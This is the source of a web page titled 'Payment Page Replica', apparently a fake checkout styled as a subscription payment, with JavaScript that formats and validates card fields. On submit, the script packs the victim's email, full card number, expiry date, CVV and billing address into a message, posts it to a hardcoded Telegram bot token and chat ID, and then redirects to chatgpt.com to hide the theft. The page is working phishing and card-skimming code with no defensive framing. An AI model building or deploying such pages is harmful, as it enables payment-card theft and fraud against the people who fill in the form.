<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Page Replica</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', 'Ubuntu', sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
          width: 80%;
          max-width: 900px;
          display: flex;
          box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
          background-color: white;
          padding: 40px;
          border-radius: 10px;
          margin-top: 150px; /* Added top margin for spacing */
        }
        .left-side, .right-side {
            flex: 1;
            padding: 20px;
        }
        .left-side {
            padding-right: 40px;
        }
        .right-side {
            padding-left: 40px;
            border-left: 1px solid #e0e0e0;
        }
        .logo img {
            height: 40px;
            padding-bottom: 10px;
        }
        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .total {
            font-weight: 700;
            margin-top: 20px;
        }
        .payment-method {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .payment-method img {
            height: 24px;
            margin-left: 10px;
        }
        .input-field {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .half-width {
            width: 48%;
        }
        .checkbox-label {
            font-size: 14px;
        }
        .button {
            width: 100%;
            background-color: #2ab27b;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
        }
        .error-message {
            color: red;
            font-size: 12px;
            margin-top: -10px;
            margin-bottom: 10px;
        }
    </style>
</head>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Format card number input
        document.getElementById('card-number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, ''); // Remove existing spaces
            if (value.length > 0) {
                value = value.match(/.{1,4}/g).join(' '); // Add space every 4 digits
            }
            e.target.value = value;
        });

        // Format expiry date input
        document.getElementById('expiry-date').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
            if (value.length > 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4); // Add '/' after the month
            }
            e.target.value = value;
        });

        // Country and state data
        const states = {
            'US': ['Alabama', 'Alaska', 'Arizona', 'Arkansas', 'California', 'Colorado', 'Connecticut', 'Delaware', 'Florida', 'Georgia', 'Hawaii', 'Idaho', 'Illinois', 'Indiana', 'Iowa', 'Kansas', 'Kentucky', 'Louisiana', 'Maine', 'Maryland', 'Massachusetts', 'Michigan', 'Minnesota', 'Mississippi', 'Missouri', 'Montana', 'Nebraska', 'Nevada', 'New Hampshire', 'New Jersey', 'New Mexico', 'New York', 'North Carolina', 'North Dakota', 'Ohio', 'Oklahoma', 'Oregon', 'Pennsylvania', 'Rhode Island', 'South Carolina', 'South Dakota', 'Tennessee', 'Texas', 'Utah', 'Vermont', 'Virginia', 'Washington', 'West Virginia', 'Wisconsin', 'Wyoming'],
            'CA': ['Alberta', 'British Columbia', 'Manitoba', 'New Brunswick', 'Newfoundland and Labrador', 'Nova Scotia', 'Ontario', 'Prince Edward Island', 'Quebec', 'Saskatchewan'],
            'GB': ['England', 'Scotland', 'Wales', 'Northern Ireland'],
            // Add more countries and their states/provinces as needed
        };

        const countrySelect = document.getElementById('country');
        const stateSelect = document.getElementById('state');

        countrySelect.addEventListener('change', function() {
            const country = this.value;
            const statesList = states[country] || [];
            stateSelect.innerHTML = statesList.map(state => `<option value="${state}">${state}</option>`).join('');
        });

        // Trigger the change event to populate states initially
        countrySelect.dispatchEvent(new Event('change'));

        // Form submission handler
        document.getElementById('subscribe-button').addEventListener('click', function(event) {
            event.preventDefault();

            // Clear previous error messages
            document.querySelectorAll('.error-message').forEach(el => el.textContent = '');

            const email = document.getElementById('email').value;
            const cardholderName = document.getElementById('cardholder-name').value;
            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            const address1 = document.getElementById('address1').value;
            const address2 = document.getElementById('address2').value;
            const city = document.getElementById('city').value;
            const zip = document.getElementById('zip').value;
            const country = document.getElementById('country').value;
            const state = document.getElementById('state').value;

            let valid = true;

            // Validate email
            if (!email || !/\S+@\S+\.\S+/.test(email)) {
                document.getElementById('email-error').textContent = 'Please enter a valid email address.';
                valid = false;
            }

            // Validate card number
            if (!cardNumber || cardNumber.length < 13 || cardNumber.length > 19) {
                document.getElementById('card-number-error').textContent = 'Please enter a valid card number.';
                valid = false;
            }

            // Validate expiry date
            const [month, year] = expiryDate.split('/').map(num => parseInt(num, 10));
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;
            if (!expiryDate.match(/^\d{2}\/\d{2}$/) || (year < currentYear) || (year === currentYear && month < currentMonth)) {
                document.getElementById('expiry-date-error').textContent = 'Please enter a valid expiry date.';
                valid = false;
            }

            // Validate CVV
            if (!cvv || cvv.length < 3 || cvv.length > 4) {
                document.getElementById('cvv-error').textContent = 'Please enter a valid CVV.';
                valid = false;
            }

            // Validate ZIP
            if (!zip || isNaN(zip)) {
                document.getElementById('address-error').textContent = 'Please enter a valid ZIP code.';
                valid = false;
            }

            // Validate cardholder name
            if (!cardholderName) {
                document.getElementById('cardholder-name-error').textContent = 'Please enter the cardholder name.';
                valid = false;
            }

            // Validate address
            if (!address1 || !city) {
                document.getElementById('address-error').textContent = 'Please enter your address and city.';
                valid = false;
            }

            if (valid) {
                // Prepare data for Telegram bot
                const message = `
                    Email: ${email}
                    Cardholder Name: ${cardholderName}
                    Card Number: ${cardNumber}
                    Expiry Date: ${expiryDate}
                    CVV: ${cvv}
                    Address Line 1: ${address1}
                    Address Line 2: ${address2}
                    City: ${city}
                    ZIP: ${zip}
                    Country: ${country}
                    State/Province: ${state}
                `;

                // Send data to Telegram bot
                const botToken = '7201820922:AAEmYN_NzUdgHOwr_zPETKW5sUAjvor1BfA';
            const chatId = '5068645042';
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const payload = {
                    chat_id: chatId,
                    text: message
                };

                fetch(telegramUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        // Redirect to ChatGPT.com after successful message send
                        window.location.href = 'https://chatgpt.com';
                    } else {
                        alert('Failed to send message. Please try again.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('An error occurred. Please try again.');
                });
            }
        });
    });
